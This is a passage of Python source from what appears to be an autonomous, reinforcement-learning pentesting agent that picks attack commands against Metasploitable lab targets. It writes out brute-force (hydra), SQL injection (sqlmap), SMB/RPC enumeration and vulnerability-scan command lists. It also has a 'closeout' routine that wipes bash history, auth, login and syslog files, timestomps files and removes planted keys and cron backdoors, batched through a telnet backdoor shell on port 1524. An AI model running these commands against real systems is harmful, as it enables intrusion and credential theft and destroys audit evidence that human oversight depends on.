                        (f"nmap -sV --top-ports {50 + step*25} {ctx.target}", "🔍 Top ports scaled"),
                        (f"host {ctx.target}", "🔍 Host basic"),
                        (f"nslookup {ctx.target}", "🔍 NS lookup"),
                    ]
                    cmd, reason = diverse_rotation[step % len(diverse_rotation)]
                    logger.warning(f"[{self.agent_name}] All fallbacks used - rotating: {cmd[:40]}...")
                
                return SmartDecisionResult(
                    command=cmd,
                    template_name="nmap_top_ports",
                    params={"target": ctx.target},
                    mentor_call=False,
                    mentor_reasoning=f"{reason}",
                    confidence=0.4,
                    phase=AttackPhase.RECON,
                )
            elif role_name == "offensive":
                # Red agent aggressive fallbacks - EXTENSIVE list with SIGNATURES for dedup
                red_fallbacks = [
                    # Web vulnerability scanning
                    (f"nikto -h http://{ctx.target}", "nikto_-h", "⚔️ Web vuln scan"),
                    (f"nikto -h http://{ctx.target} -Tuning x", "nikto_-tuning", "⚔️ Nikto extended"),
                    (f"nikto -h http://{ctx.target} -C all", "nikto_-c", "⚔️ Nikto all CGI"),
                    # Exploitation frameworks
                    (f"searchsploit linux kernel 5", "searchsploit_linux", "⚔️ Kernel exploit search"),
                    (f"searchsploit apache 2.4", "searchsploit_apache", "⚔️ Apache exploits"),
                    (f"searchsploit ssh", "searchsploit_ssh", "⚔️ SSH exploits"),
                    (f"searchsploit smb", "searchsploit_smb", "⚔️ SMB exploits"),
                    (f"searchsploit wordpress", "searchsploit_wordpress", "⚔️ WP exploits"),
                    (f"searchsploit mysql", "searchsploit_mysql", "⚔️ MySQL exploits"),
                    (f"msfconsole -q -x 'search type:exploit platform:linux; exit'", "msf_linux", "⚔️ MSF linux exploits"),
                    (f"msfconsole -q -x 'search type:exploit platform:windows; exit'", "msf_windows", "⚔️ MSF windows exploits"),
                    # Brute force (different targets)
                    (f"hydra -l admin -P /usr/share/nmap/nselib/data/passwords.lst -t 4 ssh://{ctx.target}", "hydra_ssh", "⚔️ SSH brute"),
                    (f"hydra -l root -P /usr/share/nmap/nselib/data/passwords.lst -t 4 ftp://{ctx.target}", "hydra_ftp", "⚔️ FTP brute"),
                    (f"hydra -l admin -P /usr/share/nmap/nselib/data/passwords.lst http-get://{ctx.target}", "hydra_http", "⚔️ HTTP brute"),
                    (f"hydra -l sa -P /usr/share/nmap/nselib/data/passwords.lst mssql://{ctx.target}", "hydra_mssql", "⚔️ MSSQL brute"),
                    # SMB/Network attacks
                    (f"crackmapexec smb {ctx.target} --shares", "cme_shares", "⚔️ SMB share enum"),
                    (f"crackmapexec smb {ctx.target} --users", "cme_users", "⚔️ SMB users"),
                    (f"crackmapexec smb {ctx.target} --pass-pol", "cme_passpol", "⚔️ SMB password policy"),
                    (f"crackmapexec smb {ctx.target} --groups", "cme_groups", "⚔️ SMB groups"),
                    # SQL injection (different endpoints)
                    (f"sqlmap -u 'http://{ctx.target}/?id=1' --batch", "sqlmap_id", "⚔️ SQL injection test"),
                    (f"sqlmap -u 'http://{ctx.target}/login.php' --forms --batch", "sqlmap_forms", "⚔️ SQLi form test"),
                    (f"sqlmap -u 'http://{ctx.target}/search?q=1' --batch", "sqlmap_search", "⚔️ SQLi search test"),
                    # Vuln scanning (different templates)
                    (f"nuclei -u http://{ctx.target} -t cves/ -severity critical", "nuclei_cve", "⚔️ CVE scan"),
                    (f"nuclei -u http://{ctx.target} -t vulnerabilities/", "nuclei_vuln", "⚔️ Vuln templates"),
                    (f"nuclei -u http://{ctx.target} -t exposed-panels/", "nuclei_panels", "⚔️ Exposed panels"),
                    (f"nuclei -u http://{ctx.target} -t misconfigurations/", "nuclei_misconfig", "⚔️ Misconfigs"),
                    # CMS specific
                    (f"wpscan --url http://{ctx.target} --enumerate u", "wpscan_users", "⚔️ WP user enum"),
                    (f"wpscan --url http://{ctx.target} --enumerate vp", "wpscan_plugins", "⚔️ WP vuln plugins"),
                    (f"wpscan --url http://{ctx.target} --enumerate t", "wpscan_themes", "⚔️ WP themes"),
                ]
                # Filter by signature (not just prefix)
                # Batch 12: Also filter out HTTP commands when no HTTP service, and unavailable tools
                _has_http = ctx.state_flags.get("http_service_found", False)
                _ut = getattr(self, '_unavailable_tools', set())
                def _fallback_ok(cmd):
                    binary = cmd.split()[0].split("/")[-1]
                    if binary in _ut:
                        return False
                    if not _has_http and ("http://" in cmd or "https://" in cmd):
                        return False
                    return True
                untried = [(c, sig, r) for c, sig, r in red_fallbacks 
                           if sig not in tried_signatures and c not in tried_commands and _fallback_ok(c)]
                if untried:
                    cmd, _, reason = random.choice(untried)
                else:
                    # Rotation with step-based variety
                    diverse_red = [
                        (f"searchsploit kernel {3 + step % 5}", "⚔️ Kernel search var"),
                        (f"nikto -h http://{ctx.target}:{80 + step*10}", "⚔️ Nikto alt port"),
                        (f"nuclei -u http://{ctx.target} -severity high", "⚔️ Nuclei high sev"),
                        (f"wfuzz -c -z file,/usr/share/dirb/wordlists/common.txt http://{ctx.target}/FUZZ", "⚔️ Wfuzz"),
                    ]
                    cmd, reason = diverse_red[step % len(diverse_red)]
                    logger.warning(f"[{self.agent_name}] Red fallbacks exhausted - rotating")
                return SmartDecisionResult(
                    command=cmd,
                    template_name="red_offensive",
                    params={},
                    mentor_call=False,
                    mentor_reasoning=reason,
                    confidence=0.5,
                    phase=AttackPhase.EXPLOITATION,
                )
            elif role_name == "stealth":
                # Shadow agent quiet fallbacks - EXTENSIVE list with SIGNATURES
                stealth_fallbacks = [
                    # HTTP/Web (quiet) - unique signatures
                    (f"curl -s -I http://{ctx.target} | head -20", "curl_-i", "👤 HTTP headers"),
                    (f"curl -s http://{ctx.target}/robots.txt", "curl_robots", "👤 Robots.txt"),
                    (f"curl -s http://{ctx.target}/sitemap.xml | head -50", "curl_sitemap", "👤 Sitemap"),
                    (f"curl -sL http://{ctx.target}/.well-known/security.txt", "curl_security", "👤 Security.txt"),
                    (f"curl -s http://{ctx.target}/.git/config 2>/dev/null", "curl_git", "👤 Git config leak"),
                    (f"wget -q --spider http://{ctx.target}", "wget_spider", "👤 Web check"),
                    (f"wget -q -O- http://{ctx.target}/ | head -100", "wget_page", "👤 Page preview"),
                    # DNS (passive) - unique queries
                    (f"dig {ctx.target} ANY +noall +answer", "dig_any", "👤 DNS query"),
                    (f"dig {ctx.target} TXT +short", "dig_txt", "👤 DNS TXT records"),
                    (f"dig {ctx.target} MX +short", "dig_mx", "👤 DNS MX"),
                    (f"dig {ctx.target} AXFR +noall +answer 2>/dev/null | head -20", "dig_axfr", "👤 Zone transfer"),
                    # Network probes (quiet) - different ports
                    (f"nc -zv {ctx.target} 22 2>&1 | head -1", "nc_22", "👤 SSH probe"),
                    (f"nc -zv {ctx.target} 80 2>&1 | head -1", "nc_80", "👤 HTTP probe"),
                    (f"nc -zv {ctx.target} 443 2>&1 | head -1", "nc_443", "👤 HTTPS probe"),
                    (f"nc -zv {ctx.target} 21 2>&1 | head -1", "nc_21", "👤 FTP probe"),
                    (f"nc -zv {ctx.target} 3389 2>&1 | head -1", "nc_3389", "👤 RDP probe"),
                    (f"nc -zv {ctx.target} 445 2>&1 | head -1", "nc_445", "👤 SMB probe"),
                    # SMB/Windows (quiet) - unique operations
                    (f"smbclient -L //{ctx.target} -N 2>/dev/null | head -20", "smbclient_-l", "👤 SMB shares"),
                    (f"smbclient //{ctx.target}/C$ -N -c 'ls' 2>/dev/null | head -10", "smbclient_c$", "👤 SMB C$ check"),
                    (f"smbclient //{ctx.target}/IPC$ -N -c 'ls' 2>/dev/null | head -10", "smbclient_ipc", "👤 SMB IPC$ check"),
                    # User enumeration (quiet) - unique flags
                    (f"enum4linux -U {ctx.target} 2>/dev/null", "enum4linux_-u", "👤 User enum"),
                    (f"enum4linux -S {ctx.target} 2>/dev/null", "enum4linux_-s", "👤 Share enum"),
                    (f"enum4linux -P {ctx.target} 2>/dev/null", "enum4linux_-p", "👤 Password policy"),
                    (f"enum4linux -G {ctx.target} 2>/dev/null", "enum4linux_-g", "👤 Group enum"),
                    (f"rpcclient -U '' -N {ctx.target} -c 'enumdomusers' 2>/dev/null", "rpcclient_users", "👤 RPC user enum"),
                    (f"rpcclient -U '' -N {ctx.target} -c 'querydominfo' 2>/dev/null", "rpcclient_domain", "👤 RPC domain info"),
                    (f"rpcclient -U '' -N {ctx.target} -c 'enumdomgroups' 2>/dev/null", "rpcclient_groups", "👤 RPC groups"),
                    # LDAP/AD
                    (f"ldapsearch -x -h {ctx.target} -b '' -s base 2>/dev/null | head -30", "ldapsearch_base", "👤 LDAP base"),
                    # SNMP
                    (f"snmpwalk -v2c -c public {ctx.target} 2>/dev/null | head -30", "snmpwalk_public", "👤 SNMP walk"),
                    # SSH banner
                    (f"ssh -o BatchMode=yes -o ConnectTimeout=3 {ctx.target} 2>&1 | head -5", "ssh_banner", "👤 SSH banner"),
                ]
                # Filter by signature (not just prefix)
                untried = [(c, sig, r) for c, sig, r in stealth_fallbacks 
                           if sig not in tried_signatures and c not in tried_commands]
                if untried:
                    cmd, _, reason = random.choice(untried)
                else:
                    # Rotation with step-based variety
                    diverse_stealth = [
                        (f"curl -s http://{ctx.target}/api/v{step % 5}", "👤 API probe"),
                        (f"nc -zv {ctx.target} {100 + step*50} 2>&1", "👤 Port probe"),
                        (f"dig {ctx.target} CNAME +short", "👤 DNS CNAME"),
                        (f"wget -q -O- http://{ctx.target}/page{step}", "👤 Page probe"),
                    ]
                    cmd, reason = diverse_stealth[step % len(diverse_stealth)]
                    logger.warning(f"[{self.agent_name}] Stealth fallbacks exhausted - rotating")
                return SmartDecisionResult(
                    command=cmd,
                    template_name="curl_headers",
                    params={"target": ctx.target},
                    mentor_call=False,
                    mentor_reasoning=reason,
                    confidence=0.4,
                    phase=AttackPhase.ENUMERATION,
                )
            else:
                # Generic fallback - use step-based variety to avoid loops
                generic_fallbacks = [
                    f"ping -c 2 {ctx.target}",
                    f"host {ctx.target}",
                    f"dig {ctx.target} A +short",
                    f"nslookup {ctx.target}",
                    f"traceroute -n {ctx.target} 2>/dev/null | head -5",
                    f"curl -sI http://{ctx.target} | head -5",
                    f"nc -zv {ctx.target} 80 2>&1",
                ]
                cmd = generic_fallbacks[step % len(generic_fallbacks)]
                return SmartDecisionResult(
                    command=cmd,
                    template_name="nmap_quick",
                    params={"target": ctx.target},
                    mentor_call=False,
                    confidence=0.3,
                    phase=AttackPhase.RECON,
                )
        
        # Check learned commands for suggestions (filtered by role)
        learned_suggestions = self.learned_store.get_successful_commands(
            phase=ctx.current_phase,
            min_success_rate=0.5,
            limit=5
        )
        
        # Filter learned suggestions by role AND recent history (avoid repetition)
        recent_templates = set()
        if self.decisions:
            recent_templates = {d.template_name for d in self.decisions[-3:]}
        
        role_learned = [s for s in learned_suggestions 
                        if s.template_name in [c.name for c in filtered_commands]
                        and s.template_name not in recent_templates]
        
        # Only use learned commands 30% of the time (prefer exploration)
        if role_learned and random.random() < 0.3:
            # Pick randomly from top 3 learned commands (not just the best)
            top_learned = role_learned[:min(3, len(role_learned))]
            best = random.choice(top_learned)
            template = COMMAND_REGISTRY.get(best.template_name)
            if template:
                try:
                    params = dict(best.params)
                    if "target" in template.required_params:
                        params["target"] = ctx.target
                    if "url" in template.required_params and "url" not in params:
                        params["url"] = f"http://{ctx.target}"
                    
                    command = render_command(template, params)
                    self.step_used_commands.add(template.name)
                    
                    return SmartDecisionResult(
                        command=command,
                        template_name=best.template_name,
                        params=params,
                        mentor_call=False,
                        mentor_reasoning=f"{self._role_emoji()} Proven: {template.description[:40]} (success: {best.success_rate:.0%})",
                        confidence=min(0.9, best.success_rate + 0.2),
                        phase=template.phase,
                    )
                except ValueError:
                    pass
        
        # =====================================================================
        # FALLBACK: RANDOMIZED SELECTION FROM TOP CANDIDATES
        # (PPO already tried earlier in _decide_from_registry, before fallbacks)
        # =====================================================================
        
        # Penalize recently used commands (agent's own history - last 10 decisions)
        recent_templates = set()
        if self.decisions:
            # Weight more recent commands higher (avoid last 3 strongly, next 7 moderately)
            strongly_avoid = {d.template_name for d in self.decisions[-3:]}
            moderately_avoid = {d.template_name for d in self.decisions[-10:-3]} if len(self.decisions) > 3 else set()
            recent_templates = strongly_avoid | moderately_avoid
        
        # Also avoid commands used too many times in this episode
        heavily_used = {name for name, count in self.command_repeat_count.items() if count >= 3}
        
        # Filter out recently used and heavily repeated, prioritize novel commands
        novel_commands = [c for c in filtered_commands 
                         if c.name not in recent_templates 
                         and c.name not in heavily_used
                         and c.name not in self.episode_used_commands]
        
        if novel_commands:
            filtered_commands = novel_commands
        else:
            # Second pass: allow episode-used but avoid recent and heavily_used
            less_recent = [c for c in filtered_commands 
                          if c.name not in strongly_avoid 
                          and c.name not in heavily_used]
            if less_recent:
                filtered_commands = less_recent
            else:
                # Last resort: avoid only the last 3
                last_resort = [c for c in filtered_commands if c.name not in strongly_avoid]
                if last_resort:
                    filtered_commands = last_resort
        
        # Shuffle first to break any deterministic ordering
        random.shuffle(filtered_commands)
        
        # Sort by reward but pick randomly from top 5
        filtered_commands.sort(key=lambda c: c.typical_reward, reverse=True)
        top_n = min(5, len(filtered_commands))
        
        # More uniform weights to encourage variety (less reward bias)
        weights = [1.0 + (c.typical_reward * 0.2) for c in filtered_commands[:top_n]]
        template = random.choices(filtered_commands[:top_n], weights=weights, k=1)[0]
        
        # Mark as used for this step AND episode
        self.step_used_commands.add(template.name)
        self.episode_used_commands.add(template.name)
        self.command_repeat_count[template.name] = self.command_repeat_count.get(template.name, 0) + 1
        
        # Try to fill required params
        params = {}
        for p in template.required_params:
            if p == "target":
                params[p] = ctx.target
            elif p == "url":
                params[p] = f"http://{ctx.target}"
            elif p == "ports" and "open_ports" in ctx.discoveries:
                params[p] = ",".join(str(port) for port in ctx.discoveries["open_ports"][:10])
            elif p in template.optional_params:
                params[p] = template.optional_params[p]
        
        # Add optional params
        params.update(template.optional_params)
        
        try:
            command = render_command(template, params)
        except ValueError as e:
            # Missing required param - use step-based variety
            step = getattr(self, '_current_step', 0)
            fallbacks = [
                f"masscan -p1-1000 {ctx.target}",
                f"dig {ctx.target} ANY +short",
                f"whatweb http://{ctx.target}",
                f"curl -sI http://{ctx.target}",
                f"host {ctx.target}",
            ]
            command = fallbacks[step % len(fallbacks)]
            template = COMMAND_REGISTRY.get("nmap_top_ports", list(COMMAND_REGISTRY.values())[0])
            params = {"target": ctx.target, "num_ports": "100"}
        
        return SmartDecisionResult(
            command=command,
            template_name=template.name,
            params=params,
            mentor_call=False,
            mentor_reasoning=f"{self._role_emoji()} {template.description[:50]}",
            confidence=0.6,
            phase=template.phase,
        )
    
    def _role_emoji(self) -> str:
        """Get emoji for agent role."""
        emojis = {
            "recon": "🔍",
            "offensive": "⚔️",
            "defensive": "🛡️",
            "strategic": "🎯",
            "stealth": "👤",
        }
        return emojis.get(self.agent_role.get("role"), "🤖")
    
    def clear_step_commands(self):
        """Clear used commands at start of new step (called by orchestrator)."""
        self.step_used_commands.clear()

    # =====================================================================
    # PHASE 4: PLAYBOOK-GUIDED COMMAND SELECTION
    # =====================================================================

    # =====================================================================
    # PHASE 5.2+: SKILL LIBRARY INTEGRATION
    # =====================================================================

    # =========================================================================
    # PHASE 6.9: CLOSEOUT-ONLY COMMAND SELECTION
    # When phase is CLOSEOUT, we skip the entire normal pipeline.
    # Only closeout commands are valid. Simple round-robin through the ledger.
    # =========================================================================
    CLOSEOUT_COMMAND_NAMES = [
        "remove_uploaded_tools",
        "remove_ssh_keys_planted",
        "remove_cron_backdoors",
        "cleanup_tmp_artifacts",
        "verify_target_stable",
        "clear_bash_history",
        "clear_auth_logs",
        "clear_wtmp_btmp",
        "shred_sensitive_files",
        "timestomp_closeout",
        "clear_syslog",
        "remove_known_hosts",
        "generate_report",
    ]

    # Phase 6.9.4: Pre-defined ops for single-step batch CLOSEOUT execution
    _CLOSEOUT_BATCH_OPS = {
        "remove_uploaded_tools":
            "find /tmp /dev/shm /var/tmp -name 'ariaska_*' -o -name 'payload_*' -delete 2>/dev/null; echo CLOSEOUT_TOOLS_REMOVED",
        "remove_ssh_keys_planted":
            "sed -i '/attacker/d' /root/.ssh/authorized_keys 2>/dev/null; echo CLOSEOUT_KEYS_REMOVED",
        "remove_cron_backdoors":
            "crontab -r 2>/dev/null; find /etc/cron* -name 'ariaska*' -delete 2>/dev/null; echo CLOSEOUT_CRON_REMOVED",
        "cleanup_tmp_artifacts":
            "rm -f /tmp/ariaska_* /tmp/payload_* /tmp/loot_* 2>/dev/null; echo CLOSEOUT_TMP_CLEANED",
        "verify_target_stable":
            "uptime && ps aux | wc -l && echo TARGET_STABLE_VERIFIED",
        "clear_bash_history":
            "cat /dev/null > ~/.bash_history 2>/dev/null; echo CLOSEOUT_HISTORY_CLEARED",
        "clear_auth_logs":
            "cat /dev/null > /var/log/auth.log 2>/dev/null; echo CLOSEOUT_AUTH_CLEARED",
        "clear_wtmp_btmp":
            "cat /dev/null > /var/log/wtmp 2>/dev/null; cat /dev/null > /var/log/btmp 2>/dev/null; echo CLOSEOUT_LOGIN_LOGS_CLEARED",
        "shred_sensitive_files":
            "rm -f /tmp/loot* /tmp/exfil* 2>/dev/null; echo CLOSEOUT_FILES_SHREDDED",
        "timestomp_closeout":
            "find /tmp /var/tmp /dev/shm -newer /etc/hostname -exec touch -r /etc/hostname {} \\; 2>/dev/null; echo CLOSEOUT_TIMESTAMPS_FIXED",
        "clear_syslog":
            "cat /dev/null > /var/log/syslog 2>/dev/null; echo CLOSEOUT_SYSLOG_CLEARED",
        "remove_known_hosts":
            "rm -f ~/.ssh/known_hosts /root/.ssh/known_hosts 2>/dev/null; echo CLOSEOUT_KNOWN_HOSTS_REMOVED",
        "generate_report":
            "echo === ARIASKA ENGAGEMENT REPORT === Target cleaned. All artifacts removed. REPORT_GENERATED",
    }

    def _decide_closeout_only(
        self,
        step_ctx: "SmartStepContext",
    ) -> "SmartDecisionResult":
        """Batch ALL remaining closeout commands into a single step.

        Phase 6.9.4: Instead of executing 13 commands over 13 steps,
        chains all remaining cleanup operations into one mega-command
        delivered through a single telnet session.  Cuts CLOSEOUT from
        ~13 steps to 1 step per episode.

        Args:
            step_ctx: Current step context.

        Returns:
            SmartDecisionResult with a batched closeout command.
        """
        ctx = step_ctx.attack_context
        target = ctx.target if ctx else "172.28.0.10"

        # Phase 6.9.1: Use instance-level tracking (template names, not rendered strings)
        if not hasattr(self, '_closeout_used_templates'):
            self._closeout_used_templates = set()

        # Find the first closeout command NOT yet used
        remaining = [n for n in self.CLOSEOUT_COMMAND_NAMES if n not in self._closeout_used_templates]

        # All done → just verify target stability
        if not remaining:
            command = f'{{ echo "uptime && ps aux | wc -l && echo TARGET_STABLE_VERIFIED"; sleep 2; }} | timeout 10 telnet {target} 1524'
            return SmartDecisionResult(
                command=command,
                template_name="verify_target_stable",
                params={"target": target},
                mentor_call=False,
                phase=AttackPhase.CLOSEOUT,
                confidence=0.95,
                source="closeout_gate",
                mentor_reasoning="[CLOSEOUT] All tasks done, verifying target stability",
            )

        # BATCH MODE: chain ALL remaining ops into a single telnet session
        ops = []
        for name in remaining:
            op = self._CLOSEOUT_BATCH_OPS.get(name)
            if op:
                ops.append(op)

        combined = "; ".join(ops) + "; echo CLOSEOUT_ALL_COMPLETE"

        # Single telnet session with extended timeout for the full batch
        command = f'{{ echo "{combined}"; sleep 5; }} | timeout 60 telnet {target} 1524'

        # Mark ALL as used in one shot
        self._closeout_used_templates.update(remaining)

        logger.info(
            f"[CLOSEOUT][{self.agent_name}] Phase=CLOSEOUT → BATCH "
            f"all {len(remaining)} cleanup commands in single step"
        )

        return SmartDecisionResult(
            command=command,
            template_name="closeout_batch",
            params={"target": target},
            mentor_call=False,
            phase=AttackPhase.CLOSEOUT,
            confidence=0.99,
            source="closeout_gate",
            mentor_reasoning=f"[CLOSEOUT BATCH] {len(remaining)} ops: {', '.join(remaining[:5])}{'...' if len(remaining) > 5 else ''}",
        )

    @property
    def closeout_complete(self) -> bool:
        """Returns True when all 13 closeout commands have been executed."""
        if not hasattr(self, '_closeout_used_templates'):
            return False
        return len(self._closeout_used_templates) >= len(self.CLOSEOUT_COMMAND_NAMES)

    def _query_skill_library(
        self,
        step_ctx: "SmartStepContext",
    ) -> Optional["SmartDecisionResult"]:
        """Query skill library for a high-confidence match.

        Checks learned skills (from postmortem analysis) for the current
        phase and state. Only returns a result if confidence ≥ 0.75.

        Args:
            step_ctx: Current step context.

        Returns:
            SmartDecisionResult if a matching skill is found, else None.
        """
        if not self.skill_library:
            return None

        try:
            ctx = step_ctx.attack_context
            phase_name = ctx.current_phase.name.lower() if ctx.current_phase else "recon"

            # Build keywords from current state
            keywords = [phase_name]
            for flag, active in ctx.state_flags.items():
                if active:
                    keywords.append(flag.replace("_", " "))

            # Add discovery context
            for disc_type, values in ctx.discoveries.items():
                if values:
                    keywords.append(disc_type)

            skills = self.skill_library.get_skills_for_condition(keywords)
            if not skills:
                return None

            # Take best skill with confidence ≥ 0.75
            best = skills[0]
            if best.confidence < 0.75:
                return None

            # Try to match skill's action to a registry command
            action_lower = best.then_action.lower()
            for template in COMMAND_REGISTRY.values():
                if template.name.lower() in action_lower or action_lower.startswith(template.template.split()[0].lower()):
                    # Validate role
                    if self.action_mapper and self.action_mapper.command_to_action(template.name) < 0:
                        continue  # Not in this role's pool

                    params = {}
                    for p in template.required_params:
                        params[p] = self._get_default_param(p, ctx)
                    params.update(template.optional_params)

                    try:
                        command = render_command(template, params)
                    except ValueError:
                        continue

                    logger.debug(
                        f"[SKILL][{self.agent_name}] Skill '{best.id}' "
                        f"(conf={best.confidence:.2f}) → {template.name}"
                    )

                    return SmartDecisionResult(
                        command=command,
                        template_name=template.name,
                        params=params,
                        mentor_call=False,
                        mentor_reasoning=f"🎓 Skill[{best.id}] → {best.then_action[:40]}",
                        confidence=best.confidence,
                        phase=template.phase,
                        source="skill_library",
                    )

        except Exception as e:
            logger.debug(f"Skill library query failed: {e}")

        return None

    def _playbook_suggest(
        self,
        step_ctx: "SmartStepContext",
    ) -> Optional["SmartDecisionResult"]:
        """Suggest next command from pentesting playbooks with annealing.

        Early episodes follow playbooks closely (70%); later episodes
        rely more on PPO/registry (10%). This provides curriculum-based
        exploration bootstrapping.

        R66: If scan_hints are available from ScanRandomizer and we're
        in RECON phase (step 0-1), use them for varied initial scans.

        Args:
            step_ctx: Current step context.

        Returns:
            SmartDecisionResult if playbook has a suggestion, else None.
        """
        # R66: Scan randomizer override for first 2 RECON steps
        ctx = step_ctx.attack_context
        if (ctx and ctx.current_phase == AttackPhase.RECON
                and step_ctx.step < 2
                and hasattr(ctx, '_r66_scan_hints')
                and ctx._r66_scan_hints):
            _hints = ctx._r66_scan_hints
            _idx = step_ctx.step
            if _idx < len(_hints):
                _cmd = _hints[_idx]
                return SmartDecisionResult(
                    command=_cmd,
                    source="playbook",
                    confidence=0.85,
                    template_name="scan_randomizer",
                    params={"target": ctx.target},
                    reasoning=f"[R66 ScanRandomizer] Varied initial scan step {_idx}",
                    phase=ctx.current_phase,
                )

        try:
            from core.knowledge.pentesting_playbooks import (
                get_playbooks_for_target,
                get_next_playbook_command,
            )
        except ImportError:
            return None

        ctx = step_ctx.attack_context
        episode = self.current_episode

        # Adaptive Curriculum: performance-based annealing
        # Phase 8.0: Start lower (60%) and anneal faster (3%/ep)
        # PPO has enough training now to drive most decisions
        base_prob = max(0.10, 0.60 - episode * 0.03)
        perf = self._get_curriculum_performance()
        if perf > 0.7:
            # Agent doing well — anneal faster, less hand-holding
            playbook_prob = max(0.10, base_prob * 0.4)
        elif perf < 0.3:
            # Agent struggling — keep guidance higher
            playbook_prob = min(0.80, base_prob * 1.3)
        else:
            playbook_prob = base_prob
        if random.random() > playbook_prob:
            return None

        # Get playbooks for target profile
        # Map generic difficulty labels to actual target profiles
        target_profile = getattr(ctx, 'difficulty', 'generic') or 'generic'
        if target_profile in ("medium", "easy", "hard"):
            # Detect target by IP: MS2=172.28.0.10, MS3=172.28.0.11
            target_ip = getattr(ctx, 'target', '')
            if target_ip == '172.28.0.11' or target_ip.startswith('192.168.56.10'):
                target_profile = "metasploitable3"
            elif target_ip == '172.28.0.10' or target_ip.startswith('192.168.56.10'):
                target_profile = "metasploitable2"
            elif target_ip and '172.28.0' in target_ip:
                target_profile = "metasploitable3"  # Default pentest-net = MS3
            else:
                target_profile = "generic"
        playbooks = get_playbooks_for_target(target_profile)
        if not playbooks:
            playbooks = get_playbooks_for_target("generic")
        if not playbooks:
            return None

        # Map AttackPhase enum names to playbook phase names
        # Playbooks use shortened names: "exploit", "privesc", "exfiltrate"
        # but AttackPhase.name.lower() gives: "exploitation", "privilege_escalation", "exfiltration"
        _PHASE_TO_PLAYBOOK = {
            "recon": "recon",
            "enumeration": "enumeration",
            "exploitation": "exploit",
            "privilege_escalation": "privesc",
            "lateral_movement": "lateral_movement",
            "post_exploitation": "post_exploitation",
            "exfiltration": "exfiltrate",
            "closeout": "closeout",
        }
        role_phases = [
            _PHASE_TO_PLAYBOOK.get(p.name.lower(), p.name.lower())
            for p in self.agent_role.get("primary_phases", [])
        ]

        # Try each playbook for a matching next step
        completed = [d.template_name for d in self.decisions]
        for pb in playbooks:
            # Check if playbook covers any of this role's phases
            if not any(rp in pb.phases_covered for rp in role_phases):
                continue

            # Get ALL remaining uncompleted steps from this playbook,
            # then find the first one that matches this agent's role.
            # This prevents Scout-only steps from blocking Red's playbook usage.
            completed_set = set(completed)
            matched_step = None
            for step in pb.steps:
                if step.command in completed_set:
                    continue
                # Check dependencies — only enforce deps that are in THIS role's
                # command pool. Cross-role deps (e.g., Red needs Scout's nmap)
                # are assumed met by the other agent.
                if step.depends_on:
                    own_deps = []
                    for d in step.depends_on:
                        if self.action_mapper:
                            dep_idx = self.action_mapper.command_to_action(d)
                            if dep_idx >= 0:
                                # This dep IS in our pool — must be completed
                                own_deps.append(d)
                            # else: cross-role dep, skip check
                        else:
                            own_deps.append(d)
                    if not all(d in completed_set for d in own_deps):
                        continue
                # Check if command is in this role's action mapper
                if self.action_mapper:
                    idx = self.action_mapper.command_to_action(step.command)
                    if idx < 0:
                        continue  # Skip steps not in this role's pool
                # Found a matching step for this role
                matched_step = step
                break

            if matched_step is None:
                continue

            template = COMMAND_REGISTRY.get(matched_step.command)
            if not template:
                continue

            # Phase 7.2: Skip credential-search playbook steps when creds are known
            if (ctx.state_flags.get("credentials_known") and
                    (matched_step.command in self.CRED_SEARCH_COMMANDS or
                     any(kw in matched_step.command.lower() 
                         for kw in ["brute", "hydra", "crack", "wordlist"]))):
                logger.debug(
                    f"[PLAYBOOK-CRED-SKIP] {self.agent_name}: Skipping "
                    f"{matched_step.command} — credentials already known"
                )
                completed_set.add(matched_step.command)  # Mark as done
                continue  # Try next playbook

            # Phase 7.2: Skip playbook steps from phases behind current
            _template_phase_order = self.PHASE_ORDER.get(template.phase, 0)
            _current_phase_order = self.PHASE_ORDER.get(ctx.current_phase, 0)
            if _template_phase_order < _current_phase_order - 1:
                logger.debug(
                    f"[PLAYBOOK-PHASE-SKIP] {self.agent_name}: Skipping "
                    f"{matched_step.command} ({template.phase.name}) — "
                    f"too far behind current phase ({ctx.current_phase.name})"
                )
                completed_set.add(matched_step.command)  # Mark as done
                continue  # Try next playbook

            # Batch 12: Skip HTTP-dependent commands when no HTTP service found
            _HTTP_PLAYBOOK_TOOLS = {"gobuster", "nikto", "dirb", "dirsearch",
                                    "feroxbuster", "ffuf", "wfuzz", "whatweb",
                                    "wpscan", "sqlmap", "gospider"}
            _tpl_binary = template.template.split()[0].split("/")[-1] if template.template else ""
            if (_tpl_binary in _HTTP_PLAYBOOK_TOOLS and
                    not ctx.state_flags.get("http_service_found")):
                logger.debug(
                    f"[PLAYBOOK-HTTP-SKIP] {self.agent_name}: Skipping "
                    f"{matched_step.command} ({_tpl_binary}) — no HTTP service found"
                )
                completed_set.add(matched_step.command)
                continue

            # Batch 12: Skip commands whose binary is unavailable
            if hasattr(self, '_unavailable_tools') and _tpl_binary in self._unavailable_tools:
                logger.debug(
                    f"[PLAYBOOK-TOOL-SKIP] {self.agent_name}: Skipping "
                    f"{matched_step.command} — tool '{_tpl_binary}' not installed"
                )
                completed_set.add(matched_step.command)
                continue

            # Render command
            params = {}
            for p in template.required_params:
                params[p] = self._get_default_param(p, ctx)
            params.update(template.optional_params)

            try:
                command = render_command(template, params)
            except ValueError:
                continue

            # R51: Pre-check if the rendered command is already in the episode.
            # This avoids "wasting" a decision slot on a playbook command that
            # anti-repeat will just reject. Return None to let PPO decide instead.
            _episode_cmds = set(d.command.strip() for d in self.decisions if d.command)
            if command.strip() in _episode_cmds:
                logger.debug(
                    f"[PLAYBOOK-DEDUP] {self.agent_name}: Skipping "
                    f"{matched_step.command} — already executed this episode"
                )
                continue  # Try next playbook step

            logger.debug(
                f"[PLAYBOOK][{self.agent_name}] {pb.name} → {matched_step.command} "
                f"(prob={playbook_prob:.0%}, ep={episode})"
            )

            return SmartDecisionResult(
                command=command,
                template_name=template.name,
                params=params,
                mentor_call=False,
                mentor_reasoning=f"📚 Playbook[{pb.name}] → {matched_step.description[:40]}",
                confidence=0.75,
                phase=template.phase,
                source="playbook",
            )

        return None

    # =====================================================================
    # PHASE 4: PPO-DRIVEN COMMAND SELECTION
    # =====================================================================

    def _ppo_select_command(
        self,
        step_ctx: "SmartStepContext",
        filtered_commands: List[CommandTemplate],
    ) -> Optional["SmartDecisionResult"]:
        """Use per-role PPO to select a command from filtered candidates.

        Encodes state, computes action mask (intersection of role pool
        and filtered_commands), samples from PPO with mask, and stores
        the pending trajectory entry for later reward pairing.

        Args:
            step_ctx: Current step context with attack state.
            filtered_commands: Role-filtered valid commands from registry.

        Returns:
            SmartDecisionResult if PPO picked a valid command, else None.
        """
        if not self.ppo_agent or not self.action_mapper:
            return None

